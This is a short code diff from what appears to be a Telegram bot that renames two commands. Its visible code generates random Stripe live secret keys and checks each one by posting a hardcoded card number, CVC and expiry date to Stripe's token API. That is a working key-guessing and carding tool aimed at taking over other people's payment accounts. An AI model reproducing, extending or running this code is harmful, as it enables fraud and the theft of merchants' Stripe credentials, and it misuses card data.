@@ -49,7 +49,7 @@ async def sk_checker(_, message):
         """
         await message.reply(text)
 
-@Checker.on_message(filters.command("genskey long"))
+@Checker.on_message(filters.command("gensk"))
 async def long_genskey(_, message):
     skkey = random.choice(['sk_live_51H', 'sk_live_51J']) + ''.join(random.choices(string.digits + string.ascii_letters, k=96))
     pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5159489701114434','card[cvc]': '594','card[exp_month]': '09','card[exp_year]': '2023'}, auth=(skkey, ""))
@@ -66,7 +66,7 @@ async def long_genskey(_, message):
 **ᴋᴇʏ** - `{skkey}`        
 """)
 
-@Checker.on_message(filters.command("genskey short"))
+@Checker.on_message(filters.command("sskgen"))
 async def short_genskey(_, message):  # Changed function name to avoid conflict
     skkey = "sk_live_" + ''.join(random.choices(string.digits + string.ascii_letters, k=24))
     pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5159489701114434','card[cvc]': '594','card[exp_month]': '09','card[exp_year]': '2023'}, auth=(skkey, ""))
